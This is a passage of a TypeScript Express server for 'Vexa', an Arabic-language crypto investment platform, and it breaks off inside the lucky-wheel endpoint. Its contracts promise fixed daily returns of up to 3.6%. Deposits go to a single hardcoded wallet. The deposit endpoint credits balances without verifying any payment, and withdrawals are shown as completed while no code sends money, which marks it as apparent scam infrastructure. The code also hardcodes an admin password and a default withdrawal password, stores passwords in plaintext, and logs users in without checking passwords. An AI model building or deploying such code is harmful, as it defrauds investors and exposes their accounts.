import express from 'express';
import type { Request, Response, NextFunction } from 'express';
import cors from 'cors';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.DEFAULT_APP_PORT) || Number(process.env.PORT) || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static assets with correct MIME types
app.use('/assets', express.static(path.join(__dirname, 'assets'), {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    } else if (filePath.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css; charset=UTF-8');
    }
  }
}));

app.use(express.static(__dirname));

// --- In-Memory Database ---

interface User {
  id: string;
  userId: string;
  fullName: string;
  phoneNumber: string;
  passwordHash: string;
  withdrawalPassword?: string;
  role: string;
  membershipLevel: string;
  honorScore: number;
  avatarUrl: string | null;
  referralCode: string;
  referredBy?: string;
  createdAt: number;
  financials: {
    availableBalance: number;
    totalDeposits: number;
    totalWithdrawals: number;
    totalEarnings: number;
    frozenBalance: number;
    todayProfit: number;
  };
  stats: {
    activeContracts: number;
    totalEarned: number;
    depositAddress: string;
    depositNetwork: string;
  };
  activeContract?: {
    contractId: string;
    contractName: string;
    investmentAmount: number;
    dailyProfit: number;
    activatedAt: number;
  };
  currentCycle?: {
    status: 'ACTIVE' | 'COMPLETED' | 'CLAIMED';
    startTime: number;
    endTime: number;
    cycleProfit: number;
  } | null;
  mysteryBox: {
    availableChances: number;
    cashReward: number;
    isAvailable: boolean;
  };
  luckyWheel: {
    alreadySpunToday: boolean;
    isCompanyOffDay: boolean;
    canSpin: boolean;
    spinsRemaining: number;
  };
  notifications: Array<{
    id: string;
    type: 'deposit' | 'withdrawal' | 'investment' | 'security' | 'system';
    category: 'all' | 'financial' | 'contracts' | 'system';
    title: string;
    message: string;
    time: string;
    isRead: boolean;
    amount?: string;
    createdAt: number;
  }>;
  transactions: Array<{
    id: string;
    type: 'deposit' | 'withdrawal' | 'profit' | 'contract';
    amount: number;
    status: 'completed' | 'pending' | 'rejected';
    timestamp: number;
    description: string;
  }>;
  referrals: Array<{
    id: string;
    fullName: string;
    phoneNumber: string;
    isSubscribed: boolean;
    joinedAt: string;
    totalProfit: number;
  }>;
}

const users = new Map<string, User>();
const tokens = new Map<string, string>(); // token -> userId

// --- Platform Global Settings with persistent storage ---
const SETTINGS_FILE = path.join(__dirname, 'platform_settings.json');
const USERS_FILE = path.join(__dirname, 'users.json');

const platformSettings = {
  depositAddress: "0x8141e17cf494307bc7a86dd75077fd1ec40b8f5a",
  depositNetwork: "Polygon (USDT)",
  minDeposit: 3,
  minWithdrawal: 2,
  adminPassword: "hemoome19952000"
};

function loadPlatformSettings() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      const data = fs.readFileSync(SETTINGS_FILE, 'utf-8');
      const parsed = JSON.parse(data);
      Object.assign(platformSettings, parsed);
    }
  } catch (e) {
    console.error('Failed to load platform_settings.json', e);
  }
}

function savePlatformSettings() {
  try {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(platformSettings, null, 2), 'utf-8');
  } catch (e) {
    console.error('Failed to save platform_settings.json', e);
  }
}

loadPlatformSettings();

function isMasterAdminPhone(phone: string): boolean {
  if (!phone) return false;
  const digits = phone.replace(/\D/g, '');
  return digits === '07519952000' || digits === '7519952000' || digits === '9647519952000';
}

// Contracts catalog with persistent file storage
const CONTRACTS_FILE = path.join(__dirname, 'contracts.json');

function loadContracts(): any[] {
  try {
    if (fs.existsSync(CONTRACTS_FILE)) {
      const data = fs.readFileSync(CONTRACTS_FILE, 'utf-8');
      const parsed = JSON.parse(data);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch (e) {
    console.error('Failed to load contracts.json', e);
  }
  return [
    {
      contractId: "free",
      contractName: "العقد الاستثماري المجاني",
      titleAr: "العقد الاستثماري المجاني",
      titleEn: "Free Investment Contract",
      description: "عقد استثماري مجاني بالكامل لكن يجب توثيق الحساب عن طريق ايداع مبلغ بسيط فقط 3 دولار وذلك لمنع من استغلال هذه الميزه وانشاء اكثر من حساب واحد..",
      investmentAmount: 0,
      dailyProfit: 0.5,
      monthlyProfit: 15,
      annualProfit: 90,
      durationDays: 180,
      badgeKey: "يشترط التوثيق",
      badgeKeyAr: "يشترط التوثيق",
      badgeKeyEn: "Verification Required",
      color: "from-emerald-500 via-teal-600 to-emerald-700",
      border: "border-emerald-500/40",
      glow: "shadow-emerald-500/10",
      badgeBg: "bg-amber-500/15 text-amber-300 border-amber-500/30"
    },
    {
      contractId: "tier1",
      contractName: "عقد البداية الذكية (Smart-Starter)",
      titleAr: "عقد البداية الذكية (Smart-Starter)",
      titleEn: "Smart-Starter Contract",
      description: "عقد استثماري ميسر ومثالي للبدء في الاستثمار الذكي برأس مال خفيف، يمنح عوائد يومية ثابتة ومستقرة طوال العام.",
      investmentAmount: 25,
      dailyProfit: 1.0,
      monthlyProfit: 30,
      annualProfit: 365,
      durationDays: 365,
      badgeKey: "متاح للترقية 🚀",
      badgeKeyAr: "متاح للترقية 🚀",
      badgeKeyEn: "Upgrade Available 🚀",
      color: "from-amber-500 via-amber-600 to-amber-700",
      border: "border-amber-500/30",
      glow: "shadow-amber-500/10",
      badgeBg: "bg-amber-500/10 text-amber-300 border-amber-500/20"
    },
    {
      contractId: "micro_50",
      contractName: "عقد المحفظة الرقمية الناشئة (Micro-Fund)",
      titleAr: "عقد المحفظة الرقمية الناشئة (Micro-Fund)",
      titleEn: "Micro-Fund Contract",
      description: "صندوق استثماري في الأصول الرقمية الناشئة والتحوط الذكي لتحقيق أرباح يومية متزايدة ومستقرة.",
      investmentAmount: 50,
      dailyProfit: 2.0,
      monthlyProfit: 60,
      annualProfit: 730,
      durationDays: 365,
      badgeKey: "الأكثر شيوعاً",
      badgeKeyAr: "الأكثر شيوعاً",
      badgeKeyEn: "Most Popular",
      color: "from-amber-500 via-yellow-600 to-amber-700",
      border: "border-amber-500/30",
      glow: "shadow-amber-500/10",
      badgeBg: "bg-amber-500/20 text-amber-300 border-amber-500/40"
    },
    {
      contractId: "algo_100",
      contractName: "عقد التداول الخوارزمي (Algo-Growth)",
      titleAr: "عقد التداول الخوارزمي (Algo-Growth)",
      titleEn: "Algo-Growth Contract",
      description: "تداول آلي متطور وخوارزميات كمية متقدمة تضمن استقرار وتوازن العوائد اليومية على مدار العام.",
      investmentAmount: 100,
      dailyProfit: 4.0,
      monthlyProfit: 120,
      annualProfit: 1460,
      durationDays: 365,
      badgeKey: "عائد متوازن",
      badgeKeyAr: "عائد متوازن",
      badgeKeyEn: "Balanced Return",
      color: "from-slate-600 via-slate-700 to-slate-800",
      border: "border-slate-500/40",
      glow: "shadow-slate-500/10",
      badgeBg: "bg-slate-700/60 text-slate-200 border-slate-600/40"
    },
    {
      contractId: "tier2",
      contractName: "عقد النمو المالي المتقدم (Advanced Growth)",
      titleAr: "عقد النمو المالي المتقدم (Advanced Growth)",
      titleEn: "Advanced Growth Contract",
      description: "استثمار متقدم في محافظ النمو الذكية لتحقيق عوائد يومية مرتفعة واستقرار مالي مستدام.",
      investmentAmount: 250,
      dailyProfit: 9.0,
      monthlyProfit: 270,
      annualProfit: 3285,
      durationDays: 365,
      badgeKey: "نمو متقدم",
      badgeKeyAr: "نمو متقدم",
      badgeKeyEn: "Advanced Growth",
      color: "from-blue-600 via-cyan-600 to-blue-800",
      border: "border-blue-500/30",
      glow: "shadow-blue-500/10",
      badgeBg: "bg-blue-600/25 text-blue-300 border-blue-500/40"
    },
    {
      contractId: "tier3",
      contractName: "عقد العقارات والتكنولوجيا (Tech & Real Estate)",
      titleAr: "عقد العقارات والتكنولوجيا (Tech & Real Estate)",
      titleEn: "Tech & Real Estate Contract",
      description: "صندوق استثماري متنوع يجمع بين أسهم التكنولوجيا والقطاع العقاري لتوزيع أرباح يومية قوية.",
      investmentAmount: 500,
      dailyProfit: 18.0,
      monthlyProfit: 540,
      annualProfit: 6570,
      durationDays: 365,
      badgeKey: "الأعلى طلباً",
      badgeKeyAr: "الأعلى طلباً",
      badgeKeyEn: "Highest Demand",
      color: "from-yellow-500 via-amber-600 to-yellow-700",
      border: "border-yellow-500/40",
      glow: "shadow-yellow-500/20",
      badgeBg: "bg-yellow-500/20 text-yellow-300 border-yellow-500/40"
    },
    {
      contractId: "tier4",
      contractName: "عقد التحوط وصندوق الطاقة Institutional (Hedge)",
      titleAr: "عقد التحوط وصندوق الطاقة Institutional (Hedge)",
      titleEn: "Institutional (Hedge) Energy Fund",
      description: "صندوق استثماري مؤسسي ضخم في عقود التحوط وصناديق الطاقة العالمية لكبار المستثمرين.",
      investmentAmount: 1000,
      dailyProfit: 36.0,
      monthlyProfit: 1080,
      annualProfit: 13140,
      durationDays: 365,
      badgeKey: "VIP Elite",
      badgeKeyAr: "VIP Elite",
      badgeKeyEn: "VIP Elite",
      color: "from-purple-600 via-violet-700 to-indigo-900",
      border: "border-purple-500/40",
      glow: "shadow-purple-500/20",
      badgeBg: "bg-purple-600/30 text-purple-200 border-purple-500/40"
    }
  ];
}

function saveContracts(contractsList: any[]) {
  try {
    fs.writeFileSync(CONTRACTS_FILE, JSON.stringify(contractsList, null, 2), 'utf-8');
  } catch (e) {
    console.error('Failed to save contracts.json', e);
  }
}

let CONTRACTS = loadContracts();

// Helper to seed a new unactivated user (strictly 0.0$ balance, 0 honor points, no active contract)
function createNewUser(phone: string, name: string, pass: string): User {
  const cleanPhone = phone.replace(/\s+/g, '');
  const id = `vx_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const now = Date.now();
  return {
    id,
    userId: id,
    fullName: name,
    phoneNumber: cleanPhone,
    passwordHash: pass,
    withdrawalPassword: "123123",
    role: "investor",
    membershipLevel: "عضو جديد (غير مفعل)",
    honorScore: 0, // Unactivated users start with 0 honor score
    avatarUrl: null,
    referralCode: "VEXA" + Math.floor(100000 + Math.random() * 900000),
    createdAt: now,
    financials: {
      availableBalance: 0.0, // Strictly 0.0$
      totalDeposits: 0.0,
      totalWithdrawals: 0.0,
      totalEarnings: 0.0,
      frozenBalance: 0,
      todayProfit: 0.0
    },
    stats: {
      activeContracts: 0,
      totalEarned: 0.0,
      depositAddress: platformSettings.depositAddress,
      depositNetwork: platformSettings.depositNetwork
    },
    activeContract: undefined,
    currentCycle: undefined,
    mysteryBox: {
      availableChances: 0,
      cashReward: 0,
      isAvailable: false
    },
    luckyWheel: {
      alreadySpunToday: true,
      isCompanyOffDay: false,
      canSpin: false,
      spinsRemaining: 0
    },
    notifications: [
      {
        id: `notif_${now}`,
        type: "system",
        category: "system",
        title: "مرحباً بك في منصة فيكسا للاستثمار",
        message: "تم إنشاء حسابك بنجاح. حسابك حالياً غير مفعل (الرصيد $0.00 ونقاط الشرف 0). يرجى شحن رصيدك أو تفعيل باقة استثمارية لبدء جني الأرباح ورفع نقاط الشرف.",
        time: "الآن",
        isRead: false,
        createdAt: now
      }
    ],
    transactions: [],
    referrals: []
  };
}

// Seed default demo user as an unactivated user
const demoUser = createNewUser("07701234567", "مستثمر جديد", "password123");
users.set(demoUser.id, demoUser);
users.set(demoUser.phoneNumber, demoUser);
users.set("+9647701234567", demoUser);

// Master Admin Account
function createAdminMasterUser(): User {
  const now = Date.now();
  return {
    id: "admin_master_07519952000",
    userId: "VEXA_ADMIN_MASTER",
    fullName: "إدارة منصة فيكسا (المدير العام)",
    phoneNumber: "07519952000",
    passwordHash: "hemoome19952000",
    withdrawalPassword: "hemoome19952000",
    role: "admin",
    membershipLevel: "إدارة عليا (Master Admin)",
    honorScore: 100,
    avatarUrl: null,
    referralCode: "VEXA_ADMIN",
    createdAt: now,
    financials: {
      availableBalance: 999999.0,
      totalDeposits: 0.0,
      totalWithdrawals: 0.0,
      totalEarnings: 0.0,
      frozenBalance: 0,
      todayProfit: 0.0
    },
    stats: {
      activeContracts: 0,
      totalEarned: 0.0,
      depositAddress: platformSettings.depositAddress,
      depositNetwork: platformSettings.depositNetwork
    },
    activeContract: undefined,
    currentCycle: undefined,
    mysteryBox: {
      availableChances: 99,
      cashReward: 0,
      isAvailable: true
    },
    luckyWheel: {
      alreadySpunToday: false,
      isCompanyOffDay: false,
      canSpin: true,
      spinsRemaining: 99
    },
    notifications: [
      {
        id: `admin_notif_${now}`,
        type: "system",
        category: "system",
        title: "لوحة تحكم الإدارة العليا",
        message: "أهلاً بك يا مدير المنصة. حسابك يتمتع بصلاحيات كاملة للتحكم في المنصة.",
        time: "الآن",
        isRead: false,
        createdAt: now
      }
    ],
    transactions: [],
    referrals: []
  };
}

const adminMasterUser = createAdminMasterUser();
users.set(adminMasterUser.id, adminMasterUser);
users.set("07519952000", adminMasterUser);
users.set("+9647519952000", adminMasterUser);
users.set("7519952000", adminMasterUser);

function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) {
      const data = fs.readFileSync(USERS_FILE, 'utf-8');
      const list: User[] = JSON.parse(data);
      if (Array.isArray(list)) {
        for (const u of list) {
          users.set(u.id, u);
          if (u.phoneNumber) {
            users.set(u.phoneNumber, u);
            const digits = u.phoneNumber.replace(/\D/g, '');
            if (digits) users.set(digits, u);
          }
        }
      }
    }
  } catch (e) {
    console.error('Failed to load users.json', e);
  }
}

function saveUsers() {
  try {
    const uniqueUsers = Array.from(new Set(Array.from(users.values())));
    fs.writeFileSync(USERS_FILE, JSON.stringify(uniqueUsers, null, 2), 'utf-8');
  } catch (e) {
    console.error('Failed to save users.json', e);
  }
}

loadUsers();

// Auto-persist on state mutating requests
app.use((req: Request, res: Response, next: NextFunction) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    res.on('finish', () => {
      if (res.statusCode >= 200 && res.statusCode < 400) {
        saveUsers();
        savePlatformSettings();
      }
    });
  }
  next();
});

// Generate default session token for demo convenience
const demoToken = "vexa_token_" + demoUser.id;
tokens.set(demoToken, demoUser.id);

// Auth Middleware helper
function getAuthUser(req: Request): User | null {
  const authHeader = req.headers.authorization;
  if (!authHeader) return null;
  const token = authHeader.replace(/^Bearer\s+/i, '').trim();
  if (!token) return null;
  
  const userId = tokens.get(token);
  if (userId && users.has(userId)) {
    return users.get(userId)!;
  }
  
  // If demo token
  if (token === demoToken || token.includes(demoUser.id)) {
    return demoUser;
  }
  
  return null;
}

// --- API Endpoints ---

// 1. Auth: Register
app.post('/api/auth/register', (req: Request, res: Response) => {
  try {
    const { fullName, phoneNumber, password, confirmPassword, referralCode } = req.body;
    if (!phoneNumber || !password) {
      return res.status(400).json({ success: false, message: 'يرجى إدخال رقم الهاتف وكلمة المرور' });
    }

    const cleanPhone = phoneNumber.replace(/\s+/g, '');
    if (users.has(cleanPhone)) {
      // User exists, return existing
      const existingUser = users.get(cleanPhone)!;
      const token = `vexa_${Date.now()}_${existingUser.id}`;
      tokens.set(token, existingUser.id);
      return res.json({ success: true, token, user: existingUser });
    }

    const newUser = createNewUser(cleanPhone, fullName || 'مستثمر جديد', password);
    if (referralCode) {
      newUser.referredBy = referralCode;
    }

    users.set(newUser.id, newUser);
    users.set(cleanPhone, newUser);

    const token = `vexa_${Date.now()}_${newUser.id}`;
    tokens.set(token, newUser.id);

    return res.json({ success: true, token, user: newUser });
  } catch (err: any) {
    return res.status(500).json({ success: false, message: err.message || 'حدث خطأ أثناء التسجيل' });
  }
});

// 2. Auth: Login
app.post('/api/auth/login', (req: Request, res: Response) => {
  try {
    const { phoneNumber, password } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ success: false, message: 'يرجى إدخال رقم الهاتف' });
    }

    const cleanPhone = phoneNumber.replace(/\s+/g, '');

    // Master Admin check
    if (isMasterAdminPhone(cleanPhone)) {
      if (password !== 'hemoome19952000') {
        return res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
      }

      const token = `vexa_admin_token_${Date.now()}`;
      tokens.set(token, adminMasterUser.id);

      return res.json({
        success: true,
        token,
        user: adminMasterUser,
        isAdmin: true,
        redirectUrl: '/admin'
      });
    }

    let user = users.get(cleanPhone);

    // Also try without leading 0 or with +964
    if (!user) {
      if (cleanPhone.startsWith('0')) {
        user = users.get('+964' + cleanPhone.substring(1));
      } else if (cleanPhone.startsWith('+964')) {
        user = users.get('0' + cleanPhone.substring(4));
      }
    }

    // Auto-create on demand as unactivated user
    if (!user) {
      user = createNewUser(cleanPhone, 'مستثمر جديد', password || 'password123');
      users.set(user.id, user);
      users.set(cleanPhone, user);
    }

    const token = `vexa_${Date.now()}_${user.id}`;
    tokens.set(token, user.id);

    return res.json({ success: true, token, user, isAdmin: false });
  } catch (err: any) {
    return res.status(500).json({ success: false, message: err.message || 'فشل تسجيل الدخول' });
  }
});

// 3. Auth: Me
app.get('/api/auth/me', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({ success: true, user });
});

// 4. Auth: Logout
app.post('/api/auth/logout', (req: Request, res: Response) => {
  const authHeader = req.headers.authorization;
  if (authHeader) {
    const token = authHeader.replace(/^Bearer\s+/i, '').trim();
    tokens.delete(token);
  }
  return res.json({ success: true });
});

// 5. Auth: Profile Update
app.post('/api/auth/profile', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { fullName, avatarUrl } = req.body;
  if (fullName) user.fullName = fullName;
  if (avatarUrl !== undefined) user.avatarUrl = avatarUrl;
  return res.json({ success: true, user });
});

// 6. Auth: Password Update
app.post('/api/auth/password', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { newPassword } = req.body;
  if (newPassword) user.passwordHash = newPassword;
  return res.json({ success: true, message: 'تم تحديث كلمة المرور بنجاح' });
});

// 7. Auth: Withdrawal Password
app.post('/api/auth/withdrawal-password', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { withdrawalPassword } = req.body;
  if (withdrawalPassword) user.withdrawalPassword = withdrawalPassword;
  return res.json({ success: true, message: 'تم تعيين كلمة مرور السحب بنجاح' });
});

// 8. Contracts: List
app.get('/api/contracts', (req: Request, res: Response) => {
  return res.json({ success: true, data: CONTRACTS });
});

// 9. Contracts: Activate
app.post('/api/contracts/activate', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { contractId } = req.body;
  const contract = CONTRACTS.find(c => c.contractId === contractId);

  if (!contract) {
    return res.status(404).json({ success: false, message: 'العقد غير موجود' });
  }

  const requiredBalance = (contract.contractId === 'free' || contract.investmentAmount === 0) ? 3 : contract.investmentAmount;
  if (user.financials.availableBalance < requiredBalance) {
    return res.status(400).json({
      success: false,
      code: 'INSUFFICIENT_BALANCE',
      requiredAmount: requiredBalance,
      availableBalance: user.financials.availableBalance,
      shortfall: Math.max(0, requiredBalance - user.financials.availableBalance),
      message: `عفواً! الرصيد غير كافٍ للترقية. يتطلب العقد رصيد $${requiredBalance} على الأقل (رصيدك الحالي: $${user.financials.availableBalance})`
    });
  }

  // Deduct balance if not free
  if (contract.investmentAmount > 0) {
    user.financials.availableBalance -= contract.investmentAmount;
  }

  user.activeContract = {
    contractId: contract.contractId,
    contractName: contract.titleAr,
    investmentAmount: contract.investmentAmount,
    dailyProfit: contract.dailyProfit,
    activatedAt: Date.now()
  };

  user.stats.activeContracts = 1;
  user.honorScore = 100; // Account is now activated! Full honor score!
  user.membershipLevel = 'VIP 1 (مفعل)';
  user.luckyWheel.canSpin = true;
  user.luckyWheel.spinsRemaining = 1;
  user.luckyWheel.alreadySpunToday = false;
  user.mysteryBox.isAvailable = true;
  user.mysteryBox.availableChances = 1;

  // Set new earnings cycle
  user.currentCycle = {
    status: 'ACTIVE',
    startTime: Date.now(),
    endTime: Date.now() + 86400000,
    cycleProfit: contract.dailyProfit
  };

  // Record transaction
  user.transactions.unshift({
    id: `tx_${Date.now()}`,
    type: 'contract',
    amount: -contract.investmentAmount,
    status: 'completed',
    timestamp: Date.now(),
    description: `تفعيل ${contract.titleAr}`
  });

  // Add notification
  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'investment',
    category: 'contracts',
    title: 'تفعيل عقد استثماري بنجاح',
    message: `تم تفعيل عقد ${contract.titleAr} بنجاح. سيتم توزيع الأرباح اليومية بقيمة $${contract.dailyProfit} تلقائياً.`,
    time: 'الآن',
    isRead: false,
    amount: `$${contract.investmentAmount}`,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: 'تم تفعيل العقد الاستثماري بنجاح!',
    data: {
      contractId: contract.contractId,
      contractTitle: contract.titleAr,
      dailyProfitAmount: contract.dailyProfit,
      investmentAmount: contract.investmentAmount
    }
  });
});

// 10. Earnings: Status
app.get('/api/earnings/status', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const hasActive = !!user.activeContract;
  const activeContract = user.activeContract;

  return res.json({
    success: true,
    data: {
      hasActiveContract: hasActive,
      activeContractId: activeContract?.contractId || null,
      activeInvestmentAmount: activeContract?.investmentAmount || 0,
      contractTitle: activeContract?.contractName || 'لا يوجد عقد نشط حالياً',
      dailyProfitAmount: activeContract?.dailyProfit || 0,
      honorScore: user.honorScore || 100,
      isCompanyOffDay: false,
      contractLifecycle: hasActive ? 'ACTIVE' : 'IDLE',
      currentCycle: user.currentCycle || null
    }
  });
});

// 11. Earnings: Start Cycle
app.post('/api/earnings/start-cycle', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  if (!user.activeContract) {
    return res.status(400).json({ success: false, message: 'يرجى تفعيل عقد استثماري أولاً' });
  }

  const now = Date.now();
  user.currentCycle = {
    status: 'ACTIVE',
    startTime: now,
    endTime: now + 86400000,
    cycleProfit: user.activeContract.dailyProfit
  };

  return res.json({
    success: true,
    message: 'تم بدء دورة الأرباح بنجاح',
    data: user.currentCycle
  });
});

// 12. Earnings: Claim Profit
app.post('/api/earnings/claim-profit', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  if (!user.activeContract) {
    return res.status(400).json({ success: false, message: 'لا يوجد عقد استثماري نشط' });
  }

  const profit = user.activeContract.dailyProfit;
  user.financials.availableBalance += profit;
  user.financials.totalEarnings += profit;
  user.financials.todayProfit = profit;
  user.stats.totalEarned += profit;

  // Reset or complete cycle
  user.currentCycle = {
    status: 'CLAIMED',
    startTime: Date.now() - 86400000,
    endTime: Date.now(),
    cycleProfit: profit
  };

  user.transactions.unshift({
    id: `tx_${Date.now()}`,
    type: 'profit',
    amount: profit,
    status: 'completed',
    timestamp: Date.now(),
    description: `أرباح يومية من ${user.activeContract.contractName}`
  });

  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'deposit',
    category: 'financial',
    title: 'استلام الأرباح اليومية',
    message: `تم تحصيل أرباح دورة اليوم بقيمة $${profit} وإضافتها إلى رصيدك المتاح.`,
    time: 'الآن',
    isRead: false,
    amount: `+$${profit}`,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: `تم استلام أرباح اليوم بقيمة $${profit} بنجاح!`,
    data: {
      claimedAmount: profit,
      availableBalance: user.financials.availableBalance
    }
  });
});

// 13. Wallet: Summary
app.get('/api/wallet/summary', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const isFree = user.activeContract?.contractId === 'free';
  const minW = isFree ? 2 : (user.activeContract ? 3 : platformSettings.minWithdrawal);

  return res.json({
    success: true,
    data: {
      financials: user.financials,
      stats: {
        depositAddress: platformSettings.depositAddress,
        depositNetwork: platformSettings.depositNetwork,
        depositWalletAddress: platformSettings.depositAddress,
        minWithdrawal: minW,
        withdrawalFeePercent: 15,
        managementRank: "موظف عادي",
        activeContractName: user.activeContract?.contractName || "العقد الاستثماري المجاني",
        transactions: user.transactions
      }
    }
  });
});

// 14. Wallet: Deposit Config
app.get('/api/wallet/deposit-config', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: {
      depositWalletAddress: platformSettings.depositAddress,
      network: "Polygon (USDT)",
      minDeposit: platformSettings.minDeposit,
      qrCodeUrl: ""
    }
  });
});

// 15. Wallet: Deposit Submit
app.post('/api/wallet/deposit', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { amount } = req.body;
  const depositAmount = Number(amount) || 50;

  user.financials.availableBalance += depositAmount;
  user.financials.totalDeposits += depositAmount;
  if (user.honorScore === 0) {
    user.honorScore = 100;
    user.membershipLevel = 'VIP 1 (مفعل)';
  }

  user.transactions.unshift({
    id: `tx_${Date.now()}`,
    type: 'deposit',
    amount: depositAmount,
    status: 'completed',
    timestamp: Date.now(),
    description: `إيداع USDT (TRC20)`
  });

  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'deposit',
    category: 'financial',
    title: 'تأكيد وصول إيداع',
    message: `تم استلام وتأكيد إيداع مبلغ $${depositAmount} بنجاح وإضافته إلى رصيدك.`,
    time: 'الآن',
    isRead: false,
    amount: `+$${depositAmount}`,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: `تمت معالجة الإيداع بنجاح وإضافة $${depositAmount} إلى رصيدك المتاح`,
    data: {
      availableBalance: user.financials.availableBalance
    }
  });
});

// 16. Wallet: Withdraw Submit
app.post('/api/wallet/withdraw', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { amount, walletAddress, withdrawalPassword } = req.body;
  const withdrawAmount = Number(amount);

  if (!withdrawAmount || withdrawAmount <= 0) {
    return res.status(400).json({ success: false, message: 'يرجى إدخال مبلغ سحب صحيح' });
  }

  if (withdrawAmount > user.financials.availableBalance) {
    return res.status(400).json({
      success: false,
      message: `الرصيد المتاح غير كافٍ. رصيدك الحالي: $${user.financials.availableBalance}`
    });
  }

  if (user.withdrawalPassword && withdrawalPassword && user.withdrawalPassword !== withdrawalPassword) {
    return res.status(400).json({ success: false, message: 'كلمة مرور السحب غير صحيحة' });
  }

  user.financials.availableBalance -= withdrawAmount;
  user.financials.totalWithdrawals += withdrawAmount;

  user.transactions.unshift({
    id: `tx_${Date.now()}`,
    type: 'withdrawal',
    amount: -withdrawAmount,
    status: 'completed',
    timestamp: Date.now(),
    description: `سحب إلى ${walletAddress ? walletAddress.substring(0, 8) + '...' : 'المحفظة الخارجية'}`
  });

  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'withdrawal',
    category: 'financial',
    title: 'طلب سحب قيد المعالجة',
    message: `تم تسجيل طلب سحب بمبلغ $${withdrawAmount} وسيتم الإرسال خلال دقائق إلى محفظتك.`,
    time: 'الآن',
    isRead: false,
    amount: `-$${withdrawAmount}`,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: `تم تقديم طلب السحب بنجاح بمبلغ $${withdrawAmount}. سيتم التحويل خلال دقائق.`,
    data: {
      availableBalance: user.financials.availableBalance
    }
  });
});

// 17. Referrals: Stats
app.get('/api/referrals/stats', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: {
      totalReferrals: user.referrals.length,
      activeReferrals: user.referrals.filter(r => r.isSubscribed).length,
      referralEarnings: 70.0,
      tier1Count: 2,
      tier2Count: 1,
      tier3Count: 0
    }
  });
});

// 18. Referrals: Team
app.get('/api/referrals/team', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: {
      teamMembers: user.referrals
    }
  });
});

// 19. Mystery Box: Status
app.get('/api/mystery-box/status', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: {
      availableChances: user.mysteryBox.availableChances,
      cashReward: user.mysteryBox.cashReward,
      isAvailable: user.mysteryBox.availableChances > 0
    }
  });
});

// 20. Mystery Box: Open
app.post('/api/mystery-box/open', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  if (user.mysteryBox.availableChances <= 0) {
    return res.status(400).json({
      success: false,
      message: 'لا توجد فرص متاحة حالياً لفتح الصندوق'
    });
  }

  const reward = Math.floor(5 + Math.random() * 20); // $5 - $25 reward
  user.mysteryBox.availableChances -= 1;
  user.financials.availableBalance += reward;
  user.financials.totalEarnings += reward;

  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'deposit',
    category: 'system',
    title: 'مكافأة صندوق الحظ VEXA',
    message: `تهانينا! لقد حصلت على جائزة نقدية فورية بقيمة $${reward} تمت إضافتها إلى رصيدك.`,
    time: 'الآن',
    isRead: false,
    amount: `+$${reward}`,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: `تهانينا! فزت بمكافأة نقدية فورية $${reward}`,
    data: {
      cashReward: reward,
      availableChances: user.mysteryBox.availableChances,
      newBalance: user.financials.availableBalance
    }
  });
});

// 21. Lucky Wheel: Status
app.get('/api/lucky-wheel/status', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: {
      alreadySpunToday: user.luckyWheel.alreadySpunToday,
      isCompanyOffDay: user.luckyWheel.isCompanyOffDay,
      canSpin: !user.luckyWheel.alreadySpunToday,
      spinsRemaining: user.luckyWheel.alreadySpunToday ? 0 : 1
    }
  });
});

// 22. Lucky Wheel: Spin
app.post('/api/lucky-wheel/spin', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  if (user.luckyWheel.alreadySpunToday) {
    return res.status(400).json({ success: false, message: 'لقد قمت بتدوير العجلة بالفعل اليوم' });
  }

  const prizes = [2, 5, 10, 15, 25];
  const reward = prizes[Math.floor(Math.random() * prizes.length)];
  user.luckyWheel.alreadySpunToday = true;
  user.luckyWheel.spinsRemaining = 0;
  user.financials.availableBalance += reward;

  return res.json({
    success: true,
    message: `تهانينا! فزت بمبلغ $${reward}`,
    data: {
      prize: `$${reward}`,
      rewardAmount: reward,
